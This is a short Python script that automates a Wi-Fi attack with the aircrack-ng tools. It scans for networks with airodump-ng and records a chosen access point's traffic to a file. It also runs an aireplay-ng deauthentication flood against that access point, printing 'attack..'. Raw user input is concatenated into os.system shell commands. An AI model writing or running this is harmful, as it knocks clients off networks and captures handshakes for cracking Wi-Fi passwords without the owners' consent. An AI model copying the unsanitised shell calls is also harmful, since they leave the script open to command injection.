import os
from time import sleep

def captures():
    os.system("clear")
    os.system("sudo airmon-ng")
    int = input("input interfaces: ")
    os.system("konsole --hold -geometry 800x500 -e sudo airodump-ng " + int + " &" )
    sleep(5.0)
    os.system("clear")
    print("copy bssid and channel here")
    ch = input("channel: ")
    bs = input ("bssid: ")
    cui = input ("name for new file: ")
    print("contoh 0")
    deau = input("deauth: ")
    os.system("xterm -hold -bg black -fg cyan -e sudo airodump-ng -w " + cui + " -c " + ch + " --bssid " + bs + " " + int + " &")
    os.system("clear")
    print("attack..")
    print("file capture in file system")
    os.system("xterm -hold -bg black -fg red -e sudo aireplay-ng --deauth " + deau + " -a " + bs + " " + int )
    os.system("clear")
captures()
